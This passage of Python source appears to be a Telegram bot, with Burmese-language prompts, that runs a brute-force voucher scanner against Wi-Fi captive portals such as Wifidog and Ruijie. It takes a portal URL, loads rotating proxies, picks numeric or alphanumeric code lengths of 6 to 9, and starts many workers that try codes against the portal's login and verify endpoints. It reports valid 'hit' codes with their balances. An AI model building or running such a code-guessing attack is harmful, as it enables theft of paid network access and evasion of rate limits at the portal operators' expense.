        text += "\n🔄 Last: " + last_log

        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton('🛑 Stop', callback_data='stop_scan')]])

        try:
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud['dash_msg_id'],
                text=text,
                reply_markup=keyboard,
                read_timeout=10,
                write_timeout=10,
                connect_timeout=10,
            )
            consecutive_fails = 0
        except telegram.error.TimedOut:
            consecutive_fails += 1
        except telegram.error.BadRequest as e:
            err = str(e).lower()
            if 'message is not modified' in err:
                consecutive_fails = 0
            elif 'message to edit not found' in err:
                try:
                    m = await context.bot.send_message(chat_id=user_id, text=text, reply_markup=keyboard)
                    ud['dash_msg_id'] = m.message_id
                    consecutive_fails = 0
                except Exception:
                    consecutive_fails += 1
            else:
                print(f"[dash] BadRequest: {e}")
                consecutive_fails += 1
        except telegram.error.NetworkError:
            consecutive_fails += 1
        except Exception as e:
            consecutive_fails += 1
            print(f"[dash] error ({type(e).__name__}): {e}")

        if consecutive_fails >= 5:
            try:
                m = await context.bot.send_message(chat_id=user_id, text=text, reply_markup=keyboard)
                try:
                    await context.bot.delete_message(chat_id=user_id, message_id=ud['dash_msg_id'])
                except Exception:
                    pass
                ud['dash_msg_id'] = m.message_id
                consecutive_fails = 0
                print(f"[dash] fallback: sent new message id={m.message_id}")
            except Exception as e:
                print(f"[dash] fallback send failed: {e}")

        ud['dash_update_event'].clear()
        try:
            await asyncio.wait_for(ud['dash_update_event'].wait(), timeout=8.0)
        except asyncio.TimeoutError:
            pass
        await asyncio.sleep(2.0)
    return


async def stop_user_scanner(user_id: int):
    ud = get_user_data(user_id)
    ud['stop_event'].set()
    ud['dash_update_event'].set()
    for tk in list(ud.get('tasks', [])):
        if tk and not tk.done():
            tk.cancel()
    ud['tasks'] = []
    if ud.get('dash_task') and not ud['dash_task'].done():
        ud['dash_task'].cancel()
    if ud.get('task') and not ud['task'].done():
        ud['task'].cancel()
    await asyncio.sleep(0.3)
    ud['dash_msg_id'] = None
    try:
        await get_proxy_manager().reset()
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════
#                    🚀  RUN SCANNER
# ═══════════════════════════════════════════════════════════
async def run_user_scanner(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()

    login_url, captcha_base_url, verify_url, balance_base = build_api_urls(ud['portal_url'])

    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
               'Content-Type': 'application/json',
               'Origin': get_api_base(ud['portal_url'])}

    ud['stop_event'].clear()
    ud['task'] = asyncio.current_task()
    ud['stats'] = {'tried': 0, 'hits': 0, 'expired': 0, 'limits': 0, 'start_time': time.time()}
    ud['dash_update_event'].clear()
    ud['valid_codes'] = []
    ud['limit_codes'] = []
    ud['tried_codes'] = set()
    ud['recent_logs'] = []
    ud['recheck_queue'] = []
    ud['CURRENT_CODE'] = '----'
    ud['sid_created'] = 0
    async with ud['sid_lock']:
        ud['sid_pool'] = []
        ud['sid_auth'] = {}
        ud['sid_time'] = {}

    if proxy_total == 0:
        await context.bot.send_message(chat_id=user_id, text='⚠️ **No proxies loaded!**',
                                        parse_mode=ParseMode.MARKDOWN)
        return

    if ud.get('dash_task') and not ud['dash_task'].done():
        ud['dash_task'].cancel()
    ud['dash_msg_id'] = None
    msg = await context.bot.send_message(
        chat_id=user_id,
        text='🔄 Initializing scanner dashboard...',
        parse_mode=ParseMode.MARKDOWN)
    ud['dash_msg_id'] = msg.message_id
    ud['dash_task'] = asyncio.create_task(live_dashboard_updater(context, user_id))

    try:
        await proxy_health_check(user_id, once=True)
    except Exception:
        pass

    tasks = []
    tasks.append(asyncio.create_task(proxy_health_check(user_id)))
    tasks.append(asyncio.create_task(sid_refresher(context, user_id)))

    for i in range(NUM_WORKERS):
        tasks.append(asyncio.create_task(
            worker(i, login_url, captcha_base_url, verify_url, headers, user_id, balance_base)))
    ud['tasks'] = tasks
    await asyncio.gather(*tasks, return_exceptions=True)
    ud['tasks'] = []
    ud['stop_event'].set()
    ud['dash_update_event'].set()

    stats = ud['stats']
    elapsed = max(time.time() - stats['start_time'], 0) or 1
    speed_cpm = stats['tried'] * 60 / elapsed
    hit_list = [f"{item['code']} {item.get('balance_str', '...fetching...')}" for item in ud['valid_codes']]
    final_text = (f"🛑 Scanner Stopped/Finished\n━━━━━━━━━━━━━━━━━━\n"
                  f"👑 Owner: {OWNER_NAME}\n"
                  f"🔋 Total Tried: {stats['tried']}"
                  f"\n🟢 Hits: {stats['hits']}"
                  f"\n⚡ Final Speed: {speed_cpm:.1f} c/m"
                  f"\n🔀 Proxies: {proxy_total}/{proxy_active}"
                  f"\n🧩 SID Created: {ud.get('sid_created', 0)}"
                  f"\n━━━━━━━━━━━━━━━━━━\n📋 **All Hit Codes**:\n" +
                  (('\n'.join(hit_list) + '\n') if hit_list else 'None\n'))
    if ud['dash_msg_id']:
        try:
            await context.bot.edit_message_text(chat_id=user_id, message_id=ud['dash_msg_id'], text=final_text)
        except Exception:
            await context.bot.send_message(chat_id=user_id, text=final_text)
    else:
        await context.bot.send_message(chat_id=user_id, text=final_text)
    return


# ═══════════════════════════════════════════════════════════
#                    📋  MENU
# ═══════════════════════════════════════════════════════════
def get_main_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('🌐 Update Portal', callback_data='btn_update_portal')],
        [InlineKeyboardButton('➕ Add Proxies', callback_data='btn_add_proxies')],
        [InlineKeyboardButton('🚀 Start Scanner', callback_data='btn_start_scanner')],
        [InlineKeyboardButton('⚙️ Mode', callback_data='btn_mode_menu')],
        [InlineKeyboardButton(f'👑 {OWNER_NAME}', callback_data='btn_owner')],
    ])


def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.effective_message.reply_text(
                f'⛔ ဤ Bot ကို အသုံးပြုခွင့်မရှိပါ။\n'
                f'Admin: {ADMIN_NAME} ထံ ဆက်သွယ်ပါ။')
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


@admin_only
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    portal_status = "✅ set" if ud['portal_url'] else "❌ not set"
    msg = await update.message.reply_text(
        f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
        f"👑 Owner: {OWNER_NAME}\n"
        f"👨‍💻 Admin: {ADMIN_NAME}\n\n"
        f"⚙️ Current Mode: `{ud['mode']}`\n"
        f"🔀 Proxies: `{proxy_total}/{proxy_active}`\n"
        f"🌐 Portal: {portal_status}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_markup())
    ud['menu_msg_id'] = msg.message_id
    return


@admin_only
async def add_proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud['state'] = 'waiting_for_proxy_text'
    await update.message.reply_text('📥 **Proxy များကို ယခုပို့ပါ**\n', parse_mode=ParseMode.MARKDOWN)
    ud['menu_msg_id'] = update.message.message_id
    return


@admin_only
async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    data = query.data

    if data == 'btn_owner':
        await query.message.edit_text(
            f"👑 **Owner Info**\n\n"
            f"📛 Owner: {OWNER_NAME}\n"
            f"📛 Admin: {ADMIN_NAME}\n\n"
            f"✉️ Telegram: {OWNER_NAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    if data == 'btn_update_portal':
        ud['state'] = 'waiting_for_portal_url'
        await query.message.edit_text(
            f'🌐 **Portal URL ကို ပို့ပေးပါ။**\n\n'
            f'✅ **Wifidog URL** ဖြစ်ဖြစ်\n'
            f'✅ **index.html?sessionId=xxx URL** ဖြစ်ဖြစ်\n'
            f'✅ **ဘယ် Ruijie URL မဆို** လက်ခံပါတယ်။\n\n'
            f'Bot က sessionId ကို အလိုအလျောက် ရှာပေးပါမယ်။')
        ud['menu_msg_id'] = query.message.message_id

    elif data == 'btn_mode_menu':
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton('Num 6', callback_data='set_mode_num6'),
             InlineKeyboardButton('Num 7', callback_data='set_mode_num7'),
             InlineKeyboardButton('Num 8', callback_data='set_mode_num8'),
             InlineKeyboardButton('Num 9', callback_data='set_mode_num9')],
            [InlineKeyboardButton('abc 6', callback_data='set_mode_abc6'),
             InlineKeyboardButton('abc 7', callback_data='set_mode_abc7'),
             InlineKeyboardButton('abc 8', callback_data='set_mode_abc8'),
             InlineKeyboardButton('abc 9', callback_data='set_mode_abc9')],
            [InlineKeyboardButton('mix 6', callback_data='set_mode_mix6'),
             InlineKeyboardButton('mix 7', callback_data='set_mode_mix7'),
             InlineKeyboardButton('mix 8', callback_data='set_mode_mix8'),
             InlineKeyboardButton('mix 9', callback_data='set_mode_mix9')],
            [InlineKeyboardButton('Custom Start', callback_data='set_mode_custom')],
            [InlineKeyboardButton('Custom End', callback_data='set_mode_customend')],
            [InlineKeyboardButton('⬅️ Back', callback_data='btn_back_main')],
        ])
        await query.message.edit_text('⚙️ **Choose Scanner Mode**', reply_markup=keyboard)

    elif data.startswith('set_mode_'):
        selected_mode = data.split('set_mode_')[1]
        NUM = '012345678'
        ABC = 'abcdefghijkmnpqrstuvwxyz'
        MIX = '2345678abcdefghijkmnpqrstuvwxyz'
        if selected_mode[:3] in ('num', 'abc', 'mix') and selected_mode[3:].isdigit():
            ud['mode'] = selected_mode
            ud['char_set'] = {'num': NUM, 'abc': ABC, 'mix': MIX}[selected_mode[:3]]
            ud['code_len'] = int(selected_mode[3:])
            ud['start_digit'] = None
            ud['end_digit'] = None
        elif selected_mode == 'custom':
            ud['mode'] = 'custom'
            ud['char_set'] = NUM
            ud['start_digit'] = None
            ud['state'] = 'waiting_for_digit'
            await query.message.edit_text('🔢 **Start Digit**\nဂဏန်းတစ်လုံးသာ ပြန်ပို့ပေးပါ။')
            ud['menu_msg_id'] = query.message.message_id
            return
        elif selected_mode == 'customend':
            ud['mode'] = 'customend'
            ud['char_set'] = NUM
            ud['end_digit'] = None
            ud['state'] = 'waiting_for_end_digit'
            await query.message.edit_text('🔢 **End Digit**\nအဆုံးသတ်တစ်လုံးသာ ပြန်ပို့ပေးပါ။')
            ud['menu_msg_id'] = query.message.message_id
            return
        await query.message.edit_text(
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"👑 Owner: {OWNER_NAME}\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_total}/{proxy_active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())

    elif data.startswith('set_clen_'):
        ud['code_len'] = int(data.split('set_clen_')[1])
        ud['state'] = None
        await query.message.edit_text(
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"👑 Owner: {OWNER_NAME}\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_total}/{proxy_active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())

    elif data == 'btn_add_proxies':
        ud['state'] = 'waiting_for_proxy_text'
        await query.message.edit_text(
            '📥 **Proxy များကို ယခုပို့ပါ**\nတစ်ကြောင်းလျှင် proxy တစ်ခုစီ\n'
            'ဥပမာ -\n123.45.67.89:8080\nsocks5://user:pass@host:1080\nsocks4://host:1080')
        ud['menu_msg_id'] = query.message.message_id

    elif data == 'btn_start_scanner':
        if ud['portal_url'] is None:
            await query.message.edit_text('❌ Portal URL မရှိသေးပါ။ ကျေးဇူးပြု၍ `Update Portal` အရင်လုပ်ပါ။',
                                          reply_markup=get_main_menu_markup())
            return
        if ud['task'] and not ud['task'].done():
            await stop_user_scanner(user_id)
        asyncio.create_task(run_user_scanner(context, user_id))

    elif data == 'stop_scan':
        await stop_user_scanner(user_id)
        try:
            await query.message.edit_text('🛑 Scanner stopped. Proxies reset to normal.',
                                          reply_markup=get_main_menu_markup())
        except Exception:
            pass

    elif data == 'btn_back_main':
        portal_status = "✅ set" if ud['portal_url'] else "❌ not set"
        await query.message.edit_text(
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"👑 Owner: {OWNER_NAME}\n"
            f"👨‍💻 Admin: {ADMIN_NAME}\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_total}/{proxy_active}`\n"
            f"🌐 Portal: {portal_status}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
    return


@admin_only
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    text = update.message.text.strip()
    state = ud.get('state')

    if state == 'waiting_for_portal_url':
        if not text.startswith('http'):
            await update.message.reply_text('❌ ကျေးဇူးပြု၍ http/https URL ပို့ပါ။')
            return
        ud['portal_url'] = text
        ud['state'] = None
        with open(FILE_PATH, 'a') as f:
            f.write(f"\n{PORTAL_URL_PATH}{user_id} {ud['portal_url']}")
        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        base = get_api_base(text)
        domain = urlparse(text).netloc or 'unknown'
        await update.message.reply_text(
            f"✅ Portal URL သိမ်းပြီးပါပြီ။\n\n"
            f"🌐 Domain: `{domain}`\n"
            f"🔌 API Base: `{base}`\n\n"
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"👑 Owner: {OWNER_NAME}\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_total}/{proxy_active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        ud['menu_msg_id'] = update.message.message_id

    elif state == 'waiting_for_digit':
        ud['start_digit'] = text.strip()
        ud['char_set'] = '0' + ud['char_set']
        ud['pending_custom'] = 'start'
        ud['state'] = 'waiting_for_custom_len'
        await update.message.reply_text(
            '🔢 **ဂဏန်းအရေအတွက် ရွေးပါ**',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton('6', callback_data='set_clen_6'),
                 InlineKeyboardButton('7', callback_data='set_clen_7'),
                 InlineKeyboardButton('8', callback_data='set_clen_8'),
                 InlineKeyboardButton('9', callback_data='set_clen_9')]]))
        return
    elif state == 'waiting_for_end_digit':
        ud['end_digit'] = text.strip()
        ud['char_set'] = '0' + ud['char_set']
        ud['pending_custom'] = 'end'
        ud['state'] = 'waiting_for_custom_len'
        await update.message.reply_text(
            '🔢 **ဂဏန်းအရေအတွက် ရွေးပါ**',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton('6', callback_data='set_clen_6'),
                 InlineKeyboardButton('7', callback_data='set_clen_7'),
                 InlineKeyboardButton('8', callback_data='set_clen_8'),
                 InlineKeyboardButton('9', callback_data='set_clen_9')]]))
        return
    elif state == 'waiting_for_custom_len':
        ud['state'] = None
        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        await update.message.reply_text(
            f"✅ Custom Start Digit = `{ud['start_digit']}` သတ်မှတ်ပြီးပါပြီ။\n\n"
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"👑 Owner: {OWNER_NAME}\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_total}/{proxy_active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        ud['menu_msg_id'] = update.message.message_id

    elif state == 'waiting_for_proxy_text':
        lines = text.splitlines()
        if not lines:
            await update.message.reply_text('❌ Proxy list ဗလာဖြစ်နေပါသည်။')
            return
        try:
            with open(PROXY_FILE, 'w') as f:
                f.write(text + '\n')
            pm = get_proxy_manager()
            pm.reload()
            proxy_total, proxy_active = pm.stats()
            ud['state'] = None
            await update.message.reply_text(
                f"✅ **Proxies သိမ်းပြီး**\n"
                f"📊 Total: `{proxy_total}`\n"
                f"✅ Active: `{proxy_active}`\n\n"
                f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"👑 Owner: {OWNER_NAME}\n\n"
                f"⚙️ Current Mode: `{ud['mode']}`\n"
                f"🔀 Proxies: `{proxy_total}/{proxy_active}`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=get_main_menu_markup())
            ud['menu_msg_id'] = update.message.message_id
        except Exception as e:
            await update.message.reply_text(f'❌ Proxy ဖိုင်ရေးရာတွင် အမှား: {e}')
    return


# ═══════════════════════════════════════════════════════════
#                    🛡️  ERROR HANDLER (Silent)
# ═══════════════════════════════════════════════════════════
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    err = context.error
    if isinstance(err, (telegram.error.TimedOut, asyncio.TimeoutError)):
        return
    if isinstance(err, telegram.error.NetworkError):
        return
    if isinstance(err, telegram.error.Conflict):
        print(bred + '[!] Conflict: another bot instance is already running with this token.' + reset)
        return
    if isinstance(err, telegram.error.BadRequest):
        msg = str(err).lower()
        if 'message is not modified' in msg:
            return
        if 'query is too old' in msg:
            return
        if 'message to edit not found' in msg:
            return
    print(bred + f'[!] Handler error: {type(err).__name__}: {err}' + reset)


# ═══════════════════════════════════════════════════════════
#                    🎬  MAIN
# ═══════════════════════════════════════════════════════════
def main():
    pm = get_proxy_manager()
    total, active = pm.stats()
    print(f'[MAIN] Proxy Manager initialized: {total}/{active} active proxies')
    print(f'[MAIN] SID Pool Target: {TARGET_SIDS} (min {MIN_SIDS}, batch {SID_BATCH_SIZE})')
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CommandHandler('addproxies', add_proxies_cmd))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)
    print('Bot is running with python-telegram-bot...')
    print(f'👑 Owner: {OWNER_NAME}')
    print(f'👨‍💻 Admin: {ADMIN_NAME}')
    app.run_polling()


check_approval()


if __name__ == '__main__':
    main()